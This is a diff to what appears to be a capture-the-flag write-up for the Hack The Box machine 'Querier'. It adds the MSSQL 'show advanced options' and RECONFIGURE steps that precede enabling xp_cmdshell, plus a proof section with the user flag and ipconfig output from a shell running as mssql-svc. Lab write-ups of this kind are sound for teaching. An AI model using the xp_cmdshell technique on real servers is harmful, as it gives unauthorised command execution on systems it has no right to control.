@@ -176,6 +176,9 @@ SQL> select IS_SRVROLEMEMBER ('sysadmin')
 
           1   
 
+SQL> sp_configure 'show advanced options', '1'
+[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> RECONFIGURE
 SQL> sp_configure 'xp_cmdshell', '1'
 [*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 SQL> RECONFIGURE
@@ -233,6 +236,53 @@ Windows PowerShell running as user mssql-svc on QUERIER
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
 PS C:\Windows\system32>
+```
+
+## User Proof
+
+```
+PS C:\Users\mssql-svc\desktop> hostname; whoami; type user.txt; ipconfig /all
+QUERIER
+querier\mssql-svc
+e5a83e2156a73b18c9af8ca26728468e
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : QUERIER
+   Primary Dns Suffix  . . . . . . . : HTB.LOCAL
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : HTB.LOCAL
+                                       htb
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-B9-A0-AC
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : dead:beef::186(Preferred) 
+   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 2:18:09 AM
+   Lease Expires . . . . . . . . . . : Sunday, November 6, 2022 2:18:28 AM
+   IPv6 Address. . . . . . . . . . . : dead:beef::8cc1:dc7e:539:ac36(Preferred) 
+   Link-local IPv6 Address . . . . . : fe80::8cc1:dc7e:539:ac36%13(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 10.129.13.248(Preferred) 
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Lease Obtained. . . . . . . . . . : Saturday, November 5, 2022 2:18:09 AM
+   Lease Expires . . . . . . . . . . : Sunday, November 6, 2022 2:18:30 AM
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%13
+                                       10.129.0.1
+   DHCP Server . . . . . . . . . . . : 10.129.0.1
+   DHCPv6 IAID . . . . . . . . . . . : 369119318
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-F7-80-38-00-50-56-B9-A0-AC
+   DNS Servers . . . . . . . . . . . : 1.1.1.1
+                                       8.8.8.8
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+   Connection-specific DNS Suffix Search List :
+                                       htb
+PS C:\Users\mssql-svc\desktop>
 ```
 
 ## Privilege Escalation
